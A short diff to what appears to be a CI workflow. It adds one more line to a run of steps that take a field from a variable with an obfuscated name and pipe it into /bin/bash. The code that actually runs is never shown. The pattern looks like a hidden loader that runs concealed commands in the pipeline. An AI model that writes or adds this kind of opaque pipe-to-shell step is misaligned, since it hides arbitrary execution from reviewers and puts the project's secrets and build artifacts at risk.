@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$yubrb7860" | jq -r .jxw3 | /bin/bash
           echo $uh25 | jq -r .yels60 | /bin/bash
           echo $ohe037 | jq -r .a70 | /bin/bash
+          echo $w71 | jq -r .n2 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
